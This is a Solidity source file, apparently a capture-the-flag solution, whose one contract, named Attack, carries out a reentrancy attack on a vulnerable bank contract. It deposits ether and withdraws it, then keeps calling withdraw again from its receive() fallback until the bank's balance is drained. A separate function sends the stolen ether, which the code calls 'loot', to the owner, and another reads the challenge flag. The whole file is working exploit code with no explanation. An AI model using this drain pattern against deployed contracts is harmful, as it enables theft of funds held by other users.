// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function getFlag() external view returns (string memory);
}

contract Attack {
    IVulnBank public bank;
    address payable public owner;
    uint public chunk;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "send ETH");
        chunk = msg.value;
        bank.deposit{value: msg.value}();
        bank.withdraw(msg.value);
    }

    receive() external payable {
        uint bankBalance = address(bank).balance;

        if (bankBalance > 0) {
            uint amount = bankBalance < chunk ? bankBalance : chunk;
            bank.withdraw(amount);
        }
    }

    function getFlag() external view returns (string memory) {
        return bank.getFlag();
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "not owner");
        owner.transfer(address(this).balance);
    }
}
